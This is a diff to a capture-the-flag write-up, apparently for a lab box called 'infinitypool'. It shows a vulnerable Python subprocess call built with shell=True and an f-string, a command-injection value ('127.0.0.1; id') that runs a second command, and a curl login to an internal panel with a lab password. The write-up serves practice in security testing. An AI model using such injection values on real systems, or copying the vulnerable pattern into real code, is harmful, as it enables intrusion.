@@ -55,7 +55,7 @@ The landing page is static, but `/static/app.js` carries a comment about a staff
 ![curl posting a host with a semicolon and id appended to internal netcheck, the ping output followed by uid 1001 web, then the user flag read from home web user dot txt](/img/thm-infinitypool/02-netcheck-rce.png)
 
 ```python
-subprocess.run(f"ping -c 1 {host}", shell=True, ...)
+subprocess.run(f"ping -c 1 {host}", shell=True...)
 ```
 
 `shell=True` with an f-string is the textbook mistake. `host=127.0.0.1; id` runs `id` right after the ping, and the response echoes `uid=1001(web)`. The user flag is world-readable in the service account's home:
@@ -112,7 +112,7 @@ curl -s -b cj -c cj -X POST http://127.0.0.1:8080/ucp/index.php \
   --data-urlencode 'password=St4yN0t1c3d_2026' \
   --data-urlencode "token=$TOK" \
   --data 'module=User&command=login'
-# -> {"status":true, ...}
+# -> {"status":true...}
 ```
 
 No browser needed. Just the correct handshake. I am now authenticated in the UCP as the template account.
